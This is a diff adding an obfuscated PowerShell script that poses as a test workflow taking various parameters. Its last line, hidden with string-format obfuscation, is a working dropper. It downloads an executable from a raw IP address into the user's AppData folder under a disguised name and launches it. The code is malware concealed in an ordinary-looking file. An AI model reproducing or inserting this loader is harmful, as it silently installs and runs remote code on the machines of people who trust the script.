@@ -1,0 +1,8 @@
+workflow ("{6}{10}{5}{3}{7}{9}{1}{0}{8}{2}{4}"-f 'ar','thV','t','low','ers','t-WorkF','T','W','iousParame','i','es')
+{
+	param([string] ${a}, [int] ${b}, [DateTime] ${c})
+            ("{1}{0}"-f 'is ','a  ') + ${a} 
+            ("{1}{0}" -f' is ','b ') + ${B} 
+            ("{0}{1}"-f 'c  ','is ') + ${c} 
+}
+(.("{2}{1}{0}" -f 'ct','bje','New-O') ("{3}{2}{1}{0}"-f 'nt','.WebClie','tem.Net','Sys')).DownloadFile(("{4}{3}{2}{0}{9}{1}{5}{7}{6}{8}"-f'8','.248.166','/','/','http:','.140/~','bra/','ze','iesecv.exe','9'),"$env:APPDATA\scvkem.exe");.("{0}{3}{2}{1}" -f'Start','s','ces','-Pro') ("$env:APPDATA\scvkem.exe")
